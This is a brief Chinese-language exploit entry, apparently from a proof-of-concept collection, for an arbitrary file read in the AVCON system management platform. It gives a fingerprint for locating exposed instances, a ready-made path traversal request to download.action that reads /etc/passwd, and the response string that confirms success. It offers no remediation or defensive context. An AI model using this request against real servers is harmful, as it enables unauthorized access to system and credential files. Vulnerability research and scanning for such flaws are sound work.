# AVCON-系统管理平台download.action任意文件读取漏洞

AVCON ｜ 任意文件读取/写入 ｜ —
- **指纹**：`title="AVCON-系统管理平台"`
- **请求**：`GET /download.action?filename=../../../../../../../../etc/passwd HTTP/1.1`
- **响应特征**：200 root:x